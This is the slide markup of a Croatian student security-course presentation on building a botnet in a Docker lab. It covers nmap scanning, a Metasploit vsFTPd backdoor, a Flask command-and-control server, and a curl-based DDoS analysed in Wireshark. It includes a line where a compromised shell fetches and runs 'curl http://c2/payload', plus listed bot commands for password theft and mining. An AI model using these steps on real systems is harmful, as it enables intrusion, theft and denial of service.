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59596b8d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59596b8d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959596b8d_2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959596b8d_2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59596b8d_2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959596b8d_2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59596b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959596b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959596b8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959596b8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959596b8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959596b8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59596b8d_2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959596b8d_2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959596b8d_2_1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959596b8d_2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959596b8d_2_1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959596b8d_2_1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959596b8d_2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959596b8d_2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959596b8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959596b8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959596b8d_2_1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959596b8d_2_1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setup.sh" TargetMode="External"/><Relationship Id="rId4" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://cleanup.sh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c2/payloa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Shells And Botnets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3106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 22: Leonard Inkret, Oton Lulić, Nikola Polonijo, Matej Bunić</a:t>
            </a:r>
            <a:endParaRPr/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2979900" y="4501025"/>
            <a:ext cx="3184200" cy="4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Sigurnost Informacijskih Sustava, 2026.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okruženja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Umjesto virtualnih strojeva koristili smo Docker kontejnere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Vrlo lightweight u usporedbi s VM-ovima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Troše malo memorije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Docker image instalira samo ono što eksplicitno navedemo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Lakši su za međusobno mrežno povezati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Koristimo docker network –subnet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Fiksni IP za svaki stroj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 mrežnom okruženju smo stvorili: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Jedan čvor “Attacker”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Jedan čvor “Victim”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Pet čvorova “Botova”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Jedan čvor “C2”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Skripte “</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en" u="sng">
                <a:solidFill>
                  <a:schemeClr val="hlink"/>
                </a:solidFill>
                <a:hlinkClick r:id="rId3"/>
              </a:rPr>
              <a:t>setup.sh</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en"/>
              <a:t>” i “</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en" u="sng">
                <a:solidFill>
                  <a:schemeClr val="hlink"/>
                </a:solidFill>
                <a:hlinkClick r:id="rId4"/>
              </a:rPr>
              <a:t>cleanup.sh</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en"/>
              <a:t>” koje postavljaju okruženje</a:t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okruženja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 title="ChatGPT Image Jan 20, 2026, 08_33_55 PM.png"/>
          <p:cNvPicPr preferRelativeResize="0"/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill rotWithShape="1">
          <a:blip r:embed="rId3">
            <a:alphaModFix/>
          </a:blip>
          <a:srcRect b="23509" l="0" r="0" t="19692"/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="311703" y="1295087"/>
            <a:ext cx="8520599" cy="322641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Detekcija ranjivosti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 čvorovi su pri kreiranju čisti i nezaraženi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Potrebno je dobiti shell pristup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Iz čvora napadača pokrećemo NMAP alat (“Network mapper”)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Daje popis otvorenih portova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… i poznatih ranjivosti, s opisima i službenim CVE identifikatorima - našli smo ih više od 10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425" y="2770975"/>
            <a:ext cx="5745150" cy="23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Uzrok ranjivosti botova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“Bot” Dockerfile koristi image namjerno ranjivog Ubuntu sustava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Koristi se za edukacijske svrhe i vježbu penetracijskog testiranja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Sadrži zastarjele verzije mnogih servisa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425" y="2571751"/>
            <a:ext cx="7637150" cy="17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Iskorištavanje ranjivosti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Koristimo Metasploit framework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Velika baza poznatih exploitova i payloadova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Uključuje backdoor za našu vsFTPd ranjivost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Pokretanjem iz kontejnera “Attacker” lako dolazimo do shell pristupa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8" title="Snimka zaslona 2026-01-20 1932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837" y="2452350"/>
            <a:ext cx="6250325" cy="24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 poslužitelj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“Command and Control” čvor u mreži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Umjesto da napadač ručno kontrolira svakog bota, zaražena računala natjeramo da se periodički javljaju C2 poslužitelju i traže nove naredbe koje izvršavaju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Bolja skalabilnost za ogromne botnetove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Štiti identitet napadača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Moguće jednom porukom izmijeniti programski kod na svim botovima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Male količine mrežnog prometa, može se kamuflirati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Primjeri naredbi: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Prikupljanje privatne podatke, lozinke, i šalji ih nazad na C2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 pozadini potajno rudari kriptovalute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Skeniraj lokalnu mrežu i pokušaj zaraziti drugo računalo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u="sng"/>
              <a:t>Iniciraj DDoS napad</a:t>
            </a:r>
            <a:endParaRPr b="1" u="sng"/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 poslužitelj - naša implementacija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Jednostavni Python flask HTTP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 putanje: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/payload putanja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vraća skriptu koja se u beskonačnoj petlji javlja C2 serveru i izrvšava naredbe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/cmd putanja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dohvaća trenutnu naredbu koju botovi trebaju izvršiti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/set/cmd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mijenja naredbu koju botovi izvršavaju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“Beacononing” - periodičko javljanje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Metasploit u </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en"/>
              <a:t>shellu zaraženog računala zove “curl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http://c2/payload</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en"/>
              <a:t>” i pokreće izvršavanje te skripte u pozadini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4" y="0"/>
            <a:ext cx="91325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DDoS napad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 Denial of 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Za pokretanje napada na C2 server se kao naredba šalje skripta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Beskonačno u pozadini curlom šalje HTTP zahtjeve na “Victim” stroj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Stroj Victim je postavljen kao “nginx:alpine” Docker image i ima otvoren port 80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Ogroman promet napada - tcpdump od preko 500MB u jednoj sekundi snimanja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2049050"/>
            <a:ext cx="857250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Analiza mrežnog prometa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Mrežni promet smo snimali alatom “tcpdump”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Snimali smo C2 čvor, Victim čvor, i botove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 pasivnom scenariju kada se samo vidi periodički “beaconing” svakih 5 sekundi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u scenariju kada je pokrenut DDoS napad i neprestano se otvaraju nove konekcije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Za analizu i pregled paketa koristili smo alat Wireshark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263" y="2522662"/>
            <a:ext cx="6559475" cy="17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4" title="Snimka zaslona 2026-01-20 163701.png"/>
          <p:cNvPicPr preferRelativeResize="0"/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill rotWithShape="1">
          <a:blip r:embed="rId3">
            <a:alphaModFix/>
          </a:blip>
          <a:srcRect b="0" l="20" r="-19" t="0"/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="1800" y="184070"/>
            <a:ext cx="9144001" cy="4775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5"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph idx="4294967295" type="ctrTitle"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="671258" y="1147000"/>
            <a:ext cx="78015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11"/>
              <a:t>Hvala na pažnji!</a:t>
            </a:r>
            <a:endParaRPr sz="431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1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11"/>
              <a:t>Pitanja?</a:t>
            </a:r>
            <a:endParaRPr sz="431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Slijedi demonstracija.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